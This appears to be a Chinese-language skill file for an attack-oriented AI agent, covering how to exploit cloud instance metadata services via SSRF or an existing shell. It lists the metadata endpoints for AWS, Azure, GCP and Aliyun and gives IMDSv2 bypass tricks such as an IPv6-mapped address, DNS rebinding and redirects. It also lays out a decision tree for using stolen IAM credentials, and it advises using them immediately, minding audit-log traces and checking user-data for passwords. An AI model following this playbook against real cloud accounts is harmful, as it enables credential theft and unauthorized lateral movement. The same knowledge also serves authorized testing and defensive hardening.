---
name: cloud-metadata
description: "云元数据利用。当通过 SSRF 或已获取的 shell 可以访问云实例元数据服务时使用。覆盖 AWS/Azure/GCP/阿里云的元数据端点、IAM 凭据提取、IMDSv2 绕过、从元数据到云服务枚举的完整攻击链"
metadata:
  tags: "cloud,metadata,ssrf,iam,aws,azure,gcp,aliyun,imds,元数据,云安全"
  category: "cloud"
---

# 云元数据利用方法论

IMDS 是从 SSRF/RCE 到云控制面的桥梁——一个 HTTP 请求就能获取 IAM 临时凭据。

## ⛔ 深入参考（必读）

- 需要各云平台凭据提取详细命令、AWS 快速利用、元数据信息路径 → [references/credential-extraction.md](references/credential-extraction.md)

---

## Phase 1: 确认云环境

| 线索 | 云平台 |
|------|--------|
| `x-amz-*` Header, `Server: AmazonS3` | AWS |
| `x-ms-*` Header, `.azurewebsites.net` | Azure |
| `.googleapis.com`, `x-goog-*` Header | GCP |
| `.aliyuncs.com`, `x-oss-*` Header | 阿里云 |

## Phase 2: 元数据端点速查

```
# AWS (IMDSv1 — 直接 GET)
http://169.254.169.254/latest/meta-data/

# AWS (IMDSv2 — 需要 PUT 获取 Token)
PUT http://169.254.169.254/latest/api/token
  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header: Metadata: true

# GCP
http://metadata.google.internal/computeMetadata/v1/
  Header: Metadata-Flavor: Google

# 阿里云
http://100.100.100.200/latest/meta-data/
```

## Phase 3: SSRF → 元数据

- 直接用 SSRF 请求 `http://169.254.169.254/...`
- **IMDSv2 需要 PUT + 自定义 Header** → 大多数 SSRF 无法设置 Header，这是 IMDSv2 的防护价值
- 绕过：`http://[::ffff:169.254.169.254]/`、DNS rebinding、302 重定向

## Phase 4: 凭据利用决策树

```
获取到凭据？
├─ AWS → export 环境变量 → aws sts get-caller-identity → 枚举 S3/EC2/Lambda/Secrets
├─ Azure → Bearer Token → 枚举资源
├─ GCP → OAuth Token → 枚举项目资源
└─ 阿里云 → STS Token → 枚举 OSS/ECS
详细命令 → [references/credential-extraction.md](references/credential-extraction.md)
```

获取云凭据后，参考 `cloud-iam-audit` 技能进行提权评估。

## 注意事项
- **IMDSv2** 是 AWS 对元数据 SSRF 的主要防护——纯 SSRF 基本无法利用
- 云凭据有过期时间（通常 6-12 小时），获取后应**立即利用**
- 凭据操作会留下 CloudTrail/Activity Log，注意操作痕迹
- **User-Data** (`/latest/user-data`) 经常包含启动脚本中的密码

## 多云元数据差异
- 不同云厂商的元数据地址不同（AWS: 169.254.169.254, Azure: 169.254.169.254, GCP: metadata.google.internal）
- 先确认云平台类型，再选择对应端点
- IMDSv2 需要先 PUT 获取 token，GET 无法直接获取，是两步操作

## 后续利用
- 获取云凭据后可进行横向移动，访问更多云资源，提权路径扩展攻击面
